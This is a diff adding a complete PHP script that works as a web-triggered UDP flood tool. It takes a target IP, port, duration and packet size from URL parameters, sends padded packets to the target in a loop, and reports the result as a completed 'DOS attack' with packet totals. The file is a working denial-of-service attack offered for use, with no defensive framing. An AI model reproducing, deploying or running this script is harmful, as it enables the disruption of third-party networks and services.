@@ -1,0 +1,51 @@
+<?php
+//filename.php?ip=127.0.0.1&exTime=2&port=80&timeout=2
+if(isset($_GET['ip']) &&
+    isset($_GET['exTime']) &&
+    isset($_GET['port']) &&
+    isset($_GET['timeout']) &&
+    $_GET['port'] != "" &&
+    $_GET['ip'] != "" &&
+    $_GET['timeout'] != "" &&
+    $_GET['exTime'] != ""
+    )
+    {
+       $IP=$_GET['ip'];
+           $port=$_GET['port'];
+       $executionTime = $_GET['exTime'];
+           $noOfBytes = $_GET['noOfBytes'];
+       $data = "";
+       $timeout = $_GET['timeout'];
+       $packets = 0;
+       $counter = $noOfBytes;
+       $maxTime = time() + $executionTime;;
+       while($counter--)
+       {
+            $data .= "X";
+       }
+       $data .= " I-47";
+       print "DDoS Now ... <br>";
+           
+       while(1)
+           {
+            $socket = fsockopen("udp://$IP", $port, $error, $errorString, $timeout);
+            if($socket)
+            {
+                fwrite($socket , $data);
+                fclose($socket);
+                $packets++;
+            }
+            if(time() >= $maxTime)
+            {
+                break;
+            }
+        }
+        echo "DOS attack against udp://$IP:$port completed on ".date("h:i:s A")."<br />";
+        echo "Total Number of Packets Sent : " . $packets . "<br />";
+        echo "Total Data Sent = ". ($packets*$noOfBytes) . "<br />";
+        echo "Data per packet = " . ($noOfBytes) . "<br />";
+    }
+    else
+    {
+	}
+        ?>
